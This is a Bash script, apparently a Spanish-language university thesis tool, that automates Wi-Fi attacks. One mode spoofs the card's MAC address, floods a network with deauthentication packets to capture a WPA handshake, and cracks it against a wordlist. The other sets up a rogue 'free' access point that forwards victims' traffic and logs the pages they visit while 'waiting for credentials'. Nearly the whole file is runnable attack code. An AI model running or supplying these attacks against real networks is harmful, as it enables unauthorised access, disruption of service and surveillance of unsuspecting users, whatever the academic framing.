#!/bin/bash

# Author: D.A.
#Entrada por teclado
trap ctrl_c INT
#Para que no aparezca la pantalla
export DEBIAN_FRONTEND=noninteractive

function ctrl_c(){
	echo -e "\n${yellowColour} CERRANDO LA HERRAMIENTA....${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null;sleep 3
        ifconfig wlp3s0mon down 2>/dev/null; sleep 2
        iwconfig wlp3s0mon mode monitor 2>/dev/null; sleep 1
        ifconfig wlp3s0mon up 2>/dev/null; sleep 1
        airmon-ng stop wlp3s0mon > /dev/null 2>&1; sleep 1 
        tput cnorm;service network-manager restart
        echo -e "\n${grayColour} HERRAMIENTA CERRADA ${endColour}"
        echo -e "\n${yellowColour} HASTA PRONTO --> :) ${endColour}"
	exit 0
}
function fin(){
	echo -e "\n${yellowColour} CERRANDO LA HERRAMIENTA....${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null;sleep 3
        ifconfig wlp3s0mon down 2>/dev/null; sleep 2
        iwconfig wlp3s0mon mode monitor 2>/dev/null; sleep 1
        ifconfig wlp3s0mon up 2>/dev/null; sleep 1
        airmon-ng stop wlp3s0mon > /dev/null 2>&1; sleep 1 
        tput cnorm;service network-manager restart
        echo -e "\n${grayColour} HERRAMIENTA CERRADA ${endColour}"
        echo -e "\n${yellowColour} HASTA PRONTO --> :) ${endColour}"
	exit 0
}
function bannerpresentacion(){
	clear
	echo -e "\n"
echo -e "${yellowColour}████████╗███████╗███████╗██╗███████╗        ██╗   ██╗███╗   ███╗███████╗ █████╗"
sleep 0.3
echo -e "${yellowColour}╚══██╔══╝██╔════╝██╔════╝██║██╔════╝        ██║   ██║████╗ ████║██╔════╝██╔══██╗"
sleep 0.3
echo -e "${yellowColour}   ██║   █████╗  ███████╗██║███████╗        ██║   ██║██╔████╔██║███████╗███████║"
sleep 0.3
echo -e "${yellowColour}   ██║   ██╔══╝  ╚════██║██║╚════██║        ██║   ██║██║╚██╔╝██║╚════██║██╔══██║"
sleep 0.3
echo -e "${yellowColour}   ██║   ███████╗███████║██║███████║        ╚██████╔╝██║ ╚═╝ ██║███████║██║  ██║"
sleep 0.3
echo -e "${yellowColour}   ╚═╝   ╚══════╝╚══════╝╚═╝╚══════╝         ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"

	echo -e "\n${yellowColour}            Hecho por: ${endColour}${grayColour} UNIV. CARLOS DANIEL ALVAREZ POMA ${endColour}\n"
	echo -e "${yellowColour}     ------------------------------------------------------------------- ${endColour}"
	echo -e "${grayColour}       TESIS - ANALISIS Y DETECCION DE VULNERABILIDADES EN REDES WIFI ${endColour}"
	echo -e "${grayColour}                       EN ENTORNO BASH LINUX${endColour}"
	echo -e "${yellowColour}     ------------------------------------------------------------------- ${endColour}"
	echo -e "${yellowColour}[*]${endColour}${grayColour} Modo de Uso:${endColour}"
	echo -e "\t${redColour}[->]${endColour}${yellowColour} ./poseidon.sh${endColour}${greenColour} -a${endColour}${blueColour} Nùmero de Ataque ${endColour}${greenColour}-n ${endColour}${blueColour}Nombre de la Tarjeta de Red${endColour}\n"
	echo -e "${grayColour}**************---------------**************${endColour}"
	echo -e "\t${turquoiseColour}a)${endColour}${yellowColour}Ataque${endColour}"
	echo -e "\t${greenColour}     1. ${endColour}${blueColour}Handshake${endColour}"
	echo -e "\t${greenColour}     2. ${endColour}${blueColour}Man in the Middle${endCOlour}"
	echo -e "\t${turquoiseColour}n)${endColour}${yellowColour}Nombre de la Tarjeta de red${endColour}"
	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' '  '\n'  | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t${greenColour}     $counter.${endColour}${blueColour} $interface${endColour}"; sleep 0.25
		let counter++
	done; tput cnorm
	echo -e "${grayColour}**************---------------**************${endColour}\n"
    echo -e "${yellowColour}[*] ${endColour}${grayColour}Nombre de la Tarjeta de Red${endColour}${yellowColour} (Opciòn 3):${endColour}${greenColour} (Ej:wlp3s0,wlan0,etc) ${endColour}\n"
    echo -e "${yellowColour}[*] ${endColour}${grayColour}Salir y Detener la Herramienta: ${endColour}${greenColour}(ctrl + c) ${endColour}\n"
    echo -e "${yellowColour}[*] ${endColour}${grayColour}Manual de Instrucciones, introduce: ${endColour}${yellowColour}nano Readme.txt${endColour}\n"
	exit 0
}
function programas_necesarios(){
	#Quitar el cursor
	tput civis
	clear
	echo -e "${grayColour}Actualizando su sistema y las herramientas${endColour}"
	echo -e "${yellowColour} --> Espere mientra se actualiza...${endColour}"
	apt-get update > /dev/null 2>&1
	apt-get upgrade -s > /dev/null 2>&1
	echo -e "${grayColour}     Su sistema està actualizado${endColour}${greenColour} [V] ${endColour}\n\n"
	#Vector de herramientas BIN
	herramientas=(aircrack-ng macchanger php)
	echo -e  "${yellowColour} Comprobando Instalaciòn de Programas Necesarios... ${endColour}"
	sleep 1
	#Recorriendo el vector y comprobando las herramientas
	for programas in "${herramientas[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${turquoiseColour} $programas${endColour}${blueColour}...${endColour}"
	
	#Vector de herramientas BIN
		test -f /usr/bin/$programas
		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}\n"
			echo -e " ${grayColour}HERRAMIENTA INSTALADA CORRECTAMENTE${endColour}\n"
		else
			echo -e " ${redColour}(X)${endColour}\n"
	#Instalando los programas
			echo -e "${grayColour}Instalando herramienta${endColour}${blueColour} $programas${endColour}${yellowColor}...${endColor}"
			apt-get install $programas -y > /dev/null 2>&1
			echo -e "${yellowColour}Herramienta Instalada Correctamente${endColour} "
		fi; sleep 5;
	done
	#Vector de herramientas SBIN
	dependencias=(dnsmasq hostapd)
	for programa in "${dependencias[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${turquoiseColour} $programa${endColour}${blueColour}...${endColour}"
	#Ver si esta instalada la herramienta en BIN
		test -f /usr/sbin/$programa
		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}\n"
			echo -e " ${grayColour}HERRAMIENTA INSTALADA CORRECTAMENTE${endColour}\n"
		else
			echo -e " ${redColour}(X)${endColour}\n"
	#Instalando los programas
			echo -e "${yellowColour}[*]${endColour}${grayColour}Instalando herramienta${endColour}${blueColour} $programa${endColour}${yellowColor}...${endColor}"
			apt-get install $programa -y > /dev/null 2>&1
		fi; sleep 5;
	done
}
function habilitarinternet(){
	echo -e "\n${redColour} CONECTANDO INTERNET AL EQUIPO${endColour}"
	iptables --table nat --append POSTROUTING --out-interface enp2s0f2 -j MASQUERADE
	iptables --append FORWARD --in-interface wlp3s0mon -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward
	tput civis;
	    contadorvictimas=0
	      while true; do
	      echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
              #Linea de espera
	      for i in $(seq 1 60); do echo -ne "${yellowColour}-"; done && echo -e "${endColour}"
	      #Victimas conectadas
	      		#echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$contadorvictimas${endColour}\n"
	      #Ver las paginas visitadas
	      echo -e "${yellowColour}Pàginas Visitadas ${endColour}"
	      urlsnarf -i ${networkCard}mon | cut -d\" -f4
	      for i in $(seq 1 60); do echo -ne "${yellowColour}-"; done && echo -e "${endColour}"
	      sleep 3; clear
	done
}

function ataques(){

  #Modos de ataque
  if [ "$(echo $attack_mode)" == "1" ]; then
	clear
	 echo -e "\n${whiteColour} COMENZANDO ATAQUE HANDSHAKE ${endColour}\n\n"; sleep 1
	 echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"; sleep 1
	#Colocando modo monitor
     airmon-ng start ${networkCard} > /dev/null 2>&1
    #Bajar el proceso y Asignar la direcciòn MAC-Aleatoria
     ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
	#Subir nuevamente el proceso y si es que no existe proceso
     ifconfig ${networkCard}mon  up; killall dhclient wpa_supplicant 2>/dev/null
	#Asignando la nueva direccion MAC
     echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva direcciòn MAC asignada${endColour}${purpleColour}[ ${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-90')${endColour}${purpleColour} ]${endColour}"
	#Escaneo de redes
	  xterm -hold -e "airodump-ng ${networkCard}mon" &
	#Matando el proceso
	  airodump_xterm_PID=$!
    #Esperando entrada de datos
     	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
    	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel
	#Matando el proceso de segundo plano
	kill -9 $airodump_xterm_PID
        #esperar que el proceso termine
        wait $airodump_xterm_PID 2>/dev/null
	#Capturamos los datos de entrada
	xterm -hold -e "airodump-ng -c $apChannel -w captura --essid $apName ${networkCard}mon" &
    #Proceso en segundo plano
      airodump_filter_xterm_PID=$!
     # sleep 50
      #COMIENZA ATAQUE
        #Emitir paquetes de desahutenticaci[on y espera de respuesta ed 5 seg.
         sleep 5;xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
         aireplay_xterm_PID=$!
        #Se emiten los paquetes y se matan los procesos
         sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
        #Cerramos proceso mientras captura datos y desahutentica
         sleep 10; kill -9 $airodump_filter_xterm_PID
         wait $airodump_filter_xterm_PID 2>/dev/null
        #Empieza a buscar la contrase;a con el handshake
         xterm -hold -e "aircrack-ng -w /home/alvarez/Escritorio/Diccionarios/password.lst -e $apName /home/alvarez/Escritorio/TESIS/captura-01.cap" &
# echo -e "${yellowColour} EL ATAQUE TERMINÒ ${endColour}"
	fin
 elif [ "$(echo $attack_mode)" == "2" ]; then
        
        
        clear
                echo -e "\n${whiteColour} COMENZANDO ATAQUE MAN IN THE MIDDLE ${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Configurando en modo Monitor...${endColour}"; sleep 1
	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start ${networkCard} > /dev/null 2>&1;
	sleep 0.26
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: RedGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1 - 12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=${networkCard}mon\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${greenColour}[*]${endColour}${grayColour} Configurando interfaz ${networkCard}mon${endColour}\n"
	sleep 2
	echo -e "${greenColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 4

	echo -e "\n${greenColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}\n"
	echo -e "interface=${networkCard}mon\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.1,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	#echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig ${networkCard}mon 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 2
	iptables --table nat --append POSTROUTING --out-interface enp2s0f2 -j MASQUERADE > /dev/null 2>&1 &
	iptables --append FORWARD --in-interface ${networkCard}mon -j ACCEPT > /dev/null 2>&1 &
	echo 1 > /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1 &
	sleep 3
	habilitarinternet
		#tput cnorm; Habilitar cursor
		#tput civis; contrario
else
  		echo -e "\n${redColour}[*] ! NO EXISTE ESTE MODO DE ATAQUE ! ${endColour}\n"
  fi
}
#Main Function  ------>  PRINCIPAL
#Paleta de colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
#ver si estamos en root
if [ "$(id -u)" == "0" ]; then
	declare -i conts=0; while getopts ":a:n:" arg; do
		case $arg in
			#OPTARG - AGARRA EL PARAMETRO y lo mete en la variable
		    a) attack_mode=$OPTARG; let conts+=1 ;;
		    n) networkCard=$OPTARG; let conts+=1 ;;
		esac
	done

	if  [ $conts -ne 2 ]; then
		bannerpresentacion
	else
#		programas_necesarios
		ataques
		tput cnorm
	fi
else
#	echo -e "${redColour}[*] COLOCAME MODO ROOT DE LA SIGUIENTE FORMA --> SUDO SU${endColour}\n"
	echo -e "${yellowColour}[*] PARA SU FUNCIONAMIENTO INGRESA EN MODO SUPER USUARIO Y VUELVE A CORRER EL PROGRAMA ${endColour}"
	sudo su
fi










